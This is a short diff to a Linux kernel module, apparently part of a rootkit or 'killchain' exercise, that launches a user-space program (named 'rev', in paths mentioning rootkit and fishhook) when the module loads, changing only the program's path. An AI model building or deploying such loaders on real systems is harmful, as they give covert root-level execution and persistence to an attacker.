@@ -8,7 +8,7 @@ MODULE_AUTHOR("Section E");
 MODULE_DESCRIPTION("A kernel module to launch a user-space program on load");
 MODULE_VERSION("1.0");
 
-static char *target_program = "/home/berzi/Desktop/starburst-killchain/rootkit/rev";
+static char *target_program = "/root/fishhook/rev";
 static char *target_arg = "/tmp/kmod_was_here";
 
 static int run_usermode_process(void)
